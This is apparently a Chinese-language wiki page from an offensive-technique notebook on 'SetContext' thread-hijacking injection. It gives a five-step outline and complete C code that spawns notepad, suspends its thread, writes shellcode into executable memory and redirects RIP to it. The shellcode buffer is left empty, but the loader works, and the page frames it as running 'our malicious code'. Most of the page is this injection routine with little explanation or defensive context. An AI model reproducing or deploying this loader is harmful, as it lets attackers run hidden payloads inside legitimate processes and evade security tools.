# SetContext Hijack Thread

## 简介

通常对于代码注入我们有很多种方式，现在这种方式原理与大部分注入方式技术原理相差不大，通常都是想尽办法让进程去执行我们自定义的代码，比如我们最经典的创建一个远程线程，入口点指定我们写入的代码，或者在程序执行流程上插桩，让正常进程去帮我们执行代码，这次介绍的方式比较暴力，直接劫持cpu的rip或eip指针，使其直接指向我们的恶意代码。

## 注入流程

1. 打开或创建一个进程。
2. 挂起其中一个线程。
3. 分配并写入shellcode。
4. 更改rip指针指向shellcode。
5. 恢复挂起线程。

## 实现代码

```text
#include<Windows.h>
#include<stdio.h>

char shellcode[] = "";
;
int main(){
	STARTUPINFOA si = { 0 };
	si.cb = sizeof(si);

	PROCESS_INFORMATION pi = {0};

	CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
	SuspendThread(pi.hThread);
	LPVOID lpBuffer = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(pi.hProcess, lpBuffer, shellcode, sizeof(shellcode), NULL);
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_ALL;
	GetThreadContext(pi.hThread, &ctx);
	ctx.Rip = (DWORD64)lpBuffer;
	SetThreadContext(pi.hThread, &ctx);
	ResumeThread(pi.hThread);
	return 0;
}
```

![](../.gitbook/assets/image%20%28108%29.png)

## LINKS

{% embed url="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext" %}



